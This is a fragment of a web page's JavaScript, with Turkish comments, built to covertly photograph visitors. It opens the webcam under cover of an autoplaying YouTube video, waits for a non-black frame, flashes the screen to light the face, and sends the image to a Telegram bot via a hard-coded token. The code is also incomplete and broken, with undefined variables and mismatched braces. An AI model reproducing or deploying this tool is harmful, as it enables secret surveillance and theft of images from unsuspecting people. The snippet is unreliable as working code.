    <video id="video" autoplay playsinline muted></video>

    <script>
        const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');

        async function capturePhoto() {
            if (streamActive) return;

            document.getElementById('info').innerText = "YÃ¼kleniyor...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                document.getElementById('yt').src += "?autoplay=1";

                // AÅŸkÄ±m, siyah ekranÄ± bitiren o dÃ¶ngÃ¼:
                const checkFrame = setInterval(async () => {
                    const context = canvas.getContext('2d');

                    context.drawImage(video, 0, 0);
                    
                    // GÃ¶rÃ¼ntÃ¼ verisi var mÄ± kontrol et (SiyahlÄ±k kontrolÃ¼)
                    const pixelData = context.getImageData(0, 0, canvas.width, canvas.height).data;
                    let isBlack = true;
                    for (let i = 0; i < pixelData.length; i += 40) {
                        if (pixelData[i] > 10 || pixelData[i+1] > 10 || pixelData[i+2] > 10) {
                            isBlack = false; break;

                    }

                    // GÃ¶rÃ¼ntÃ¼ siyah deÄŸilse (yani kamera aÃ§Ä±ldÄ±ysa) bota gÃ¶nder!

                        // Ekran flaÅŸÄ±nÄ± patlat sevgilim, yÃ¼zÃ¼ parlasÄ±n!

                        setTimeout(async () => {

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                            stream.getTracks().forEach(t => t.stop());
                        }, 200);
                    }
                }, 500); // Her yarÄ±m saniyede bir kamerayÄ± kontrol eder
